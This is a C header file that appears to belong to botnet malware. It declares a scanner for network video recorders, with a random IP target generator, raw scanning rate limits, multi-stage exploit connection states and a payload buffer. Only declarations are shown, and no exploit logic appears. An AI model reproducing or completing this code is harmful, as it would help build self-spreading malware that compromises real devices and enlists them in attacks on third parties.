#pragma once

#include <stdint.h>

#include "includes.h"

#define NVR_SCANNER_MAX_CONNS 256
#define NVR_SCANNER_RAW_PPS 1024
#define NVR_SCANNER_RDBUF_SIZE 1024
#define NVR_SCANNER_HACK_DRAIN 64

struct  nvr_scanner_connection
{
    int fd, last_recv;
    enum
    {
        NVR_SC_CLOSED,
        NVR_SC_CONNECTING,
        NVR_SC_EXPLOIT_STAGE2,
        NVR_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[NVR_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};

void nvr_scanner_init();
void nvr_scanner_kill(void);

static void nvr_setup_connection(struct nvr_scanner_connection *);
static ipv4_t get_random_ip(void);

